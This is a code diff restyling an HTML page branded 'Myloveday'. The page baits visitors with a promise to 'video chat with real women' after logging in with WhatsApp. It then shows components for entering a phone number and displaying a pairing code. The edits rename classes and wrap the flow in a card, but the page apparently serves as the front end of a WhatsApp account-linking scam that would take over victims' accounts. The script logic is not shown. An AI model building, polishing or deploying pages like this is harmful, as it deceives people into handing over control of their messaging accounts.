@@ -12,37 +12,38 @@
     <link rel="stylesheet" href="assets/theme.css" />
   </head>
   <body>
-    <div class="scene-backdrop" aria-hidden="true">
-      <div class="main-image-section">
-        <div class="scrolling-images">
-          <div class="scrolling-image"></div>
-          <div class="scrolling-image"></div>
+    <div class="scene" aria-hidden="true">
+      <div class="scene-scroll">
+        <div class="scene-scroll-track">
+          <div class="scene-scroll-frame"></div>
+          <div class="scene-scroll-frame"></div>
         </div>
       </div>
-      <div class="thumbnails">
-        <div class="thumbnails-container">
-          <img src="assets/images/2.jpg" alt="" class="thumbnail" width="437" height="779" />
-          <img src="assets/images/3-1.jpg" alt="" class="thumbnail" width="440" height="779" loading="lazy" />
-          <img src="assets/images/4.jpg" alt="" class="thumbnail" width="439" height="777" loading="lazy" />
-          <img src="assets/images/5-1.jpg" alt="" class="thumbnail" width="439" height="779" loading="lazy" />
-          <img src="assets/images/6-1.jpg" alt="" class="thumbnail" width="460" height="690" loading="lazy" />
-          <img src="assets/images/7.jpg" alt="" class="thumbnail" width="438" height="780" loading="lazy" />
-          <img src="assets/images/8.jpg" alt="" class="thumbnail" width="437" height="780" loading="lazy" />
-          <img src="assets/images/2.jpg" alt="" class="thumbnail" width="437" height="779" loading="lazy" />
-          <img src="assets/images/3-1.jpg" alt="" class="thumbnail" width="440" height="779" loading="lazy" />
-          <img src="assets/images/4.jpg" alt="" class="thumbnail" width="439" height="777" loading="lazy" />
+      <div class="scene-veil"></div>
+      <div class="scene-thumbs">
+        <div class="scene-thumbs-track">
+          <img src="assets/images/2.jpg" alt="" class="scene-thumb" width="437" height="779" />
+          <img src="assets/images/3-1.jpg" alt="" class="scene-thumb" width="440" height="779" loading="lazy" />
+          <img src="assets/images/4.jpg" alt="" class="scene-thumb" width="439" height="777" loading="lazy" />
+          <img src="assets/images/5-1.jpg" alt="" class="scene-thumb" width="439" height="779" loading="lazy" />
+          <img src="assets/images/6-1.jpg" alt="" class="scene-thumb" width="460" height="690" loading="lazy" />
+          <img src="assets/images/7.jpg" alt="" class="scene-thumb" width="438" height="780" loading="lazy" />
+          <img src="assets/images/8.jpg" alt="" class="scene-thumb" width="437" height="780" loading="lazy" />
+          <img src="assets/images/2.jpg" alt="" class="scene-thumb" width="437" height="779" loading="lazy" />
+          <img src="assets/images/3-1.jpg" alt="" class="scene-thumb" width="440" height="779" loading="lazy" />
+          <img src="assets/images/4.jpg" alt="" class="scene-thumb" width="439" height="777" loading="lazy" />
         </div>
       </div>
     </div>
 
     <main class="theme-shell">
       <header class="campaign-header">
-        <h1 class="title-text" data-copy="brandTitle">Myloveday</h1>
-        <div class="left-image-text-container">
-          <div class="left-image">
-            <img src="assets/images/cs1.jpg" alt="" width="437" height="779" loading="lazy" />
+        <h1 class="brand-title" data-copy="brandTitle">Myloveday</h1>
+        <div class="hero-row">
+          <div class="hero-avatar">
+            <img src="assets/images/cs1.jpg" alt="" width="437" height="779" />
           </div>
-          <p class="text-label" data-copy="heroText">
+          <p class="hero-text" data-copy="heroText">
             Log in with WhatsApp to video chat with real women. (The women here are very direct.)
           </p>
         </div>
@@ -53,15 +54,17 @@
         <p data-copy="overlaySubtitle">Enjoy more exciting content!</p>
       </div>
 
-      <account-link-flow>
-        <account-link-locale-switcher></account-link-locale-switcher>
-        <phone-number-field></phone-number-field>
-        <account-link-submit></account-link-submit>
-        <pairing-code-panel></pairing-code-panel>
-        <app-launch-actions></app-launch-actions>
-        <account-link-status></account-link-status>
-        <account-initialization-status></account-initialization-status>
-      </account-link-flow>
+      <section class="link-card">
+        <account-link-flow>
+          <account-link-locale-switcher></account-link-locale-switcher>
+          <phone-number-field></phone-number-field>
+          <account-link-submit></account-link-submit>
+          <pairing-code-panel></pairing-code-panel>
+          <app-launch-actions></app-launch-actions>
+          <account-link-status></account-link-status>
+          <account-initialization-status></account-initialization-status>
+        </account-link-flow>
+      </section>
     </main>
   </body>
 </html>
